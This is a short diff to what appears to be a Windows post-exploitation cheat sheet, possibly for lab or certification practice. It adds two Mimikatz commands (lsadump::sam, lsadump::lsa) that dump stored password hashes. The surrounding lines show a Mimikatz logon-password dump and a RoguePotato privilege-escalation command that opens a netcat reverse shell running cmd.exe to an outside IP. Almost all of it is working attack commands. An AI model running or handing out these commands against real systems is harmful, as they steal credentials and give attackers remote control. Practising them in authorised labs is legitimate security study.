@@ -21,6 +21,8 @@ get-childitem -path c:\users\ -include *.txt,*.pdf,*.doc,*.docx,*.xls,*.xlsx,*.l
 
 Mimikatz non interactive
 .\mimikatz.exe privilege::debug sekurlsa::logonpasswords exit
+lsadump::sam
+lsadump::lsa
 
 Roguepotato
 .\RoguePotato.exe -r 192.168.45.203 -e "C:\Users\Public\nc.exe 192.168.45.203 3001 -e cmd.exe" -l 9999
